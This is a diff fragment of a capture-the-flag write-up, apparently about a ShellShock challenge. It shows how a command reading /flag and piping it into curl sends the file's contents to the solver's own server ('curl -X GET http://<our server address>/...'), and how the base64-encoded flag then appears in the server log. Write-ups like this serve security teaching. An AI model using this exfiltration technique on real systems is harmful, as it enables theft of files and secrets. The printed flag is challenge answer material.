@@ -65,7 +65,13 @@ This command will read contents of ```/flag``` and will pipe it into curl. curl 
 curl -X GET http://<our server address>/<contents of "/flag">
 ```
 
-On the other hand if we check our server log-files or wireshark/tshark output, we will get something like below:
+On the other hand if we check our server log-files or wireshark/tshark output, we will see a GET request for a url like below:
+
+```
+http://simpleweb.iutcert.io/Q2hldCBSYW1leSBpcyB0aGUgbWFpbnRhaW5lciBvZiBTaGVsbFNob2NrIHZ1bG5lcmFiaWxpdHkuIGZsYWcgaXMgU2gzbGw1aDBDS180MW0wNTdfayExMTNkX0I0NUhISAo
+```
+
+So the directory after simpleweb.iutcert.io, is actually the contents of ```/flag```:
 
 ```
 Q2hldCBSYW1leSBpcyB0aGUgbWFpbnRhaW5lciBvZiBTaGVsbFNob2NrIHZ1bG5lcmFiaWxpdHkuIGZsYWcgaXMgU2gzbGw1aDBDS180MW0wNTdfayExMTNkX0I0NUhISAo=
